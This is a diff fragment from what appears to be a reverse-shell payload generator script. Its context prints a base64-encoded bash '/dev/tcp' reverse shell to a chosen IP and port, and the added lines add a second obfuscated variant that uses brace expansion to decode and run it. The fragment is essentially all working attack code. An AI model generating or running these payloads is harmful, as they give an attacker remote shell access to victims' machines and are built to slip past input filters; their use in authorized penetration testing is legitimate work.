@@ -57,6 +57,12 @@ then
 	echo -e "${RED}[+]${NC} bash -i base64 encoded"
 	enc=`echo -n "/bin/bash -i >& /dev/tcp/$ip/$port 0>&1" | base64`
 	echo "echo -n \"$enc\" | base64 -d | bash"
+	echo ""
+	
+	echo -e "${RED}[+]${NC} bash -i base64 encoded 2"
+        enc=`echo -n "/bin/bash -i >& /dev/tcp/$ip/$port 0>&1" | base64`
+        echo "bash -c {echo,$enc}|{base64,-d}|{bash,-i}"
+
 fi
 if [ $1 == "nc" ]
 then
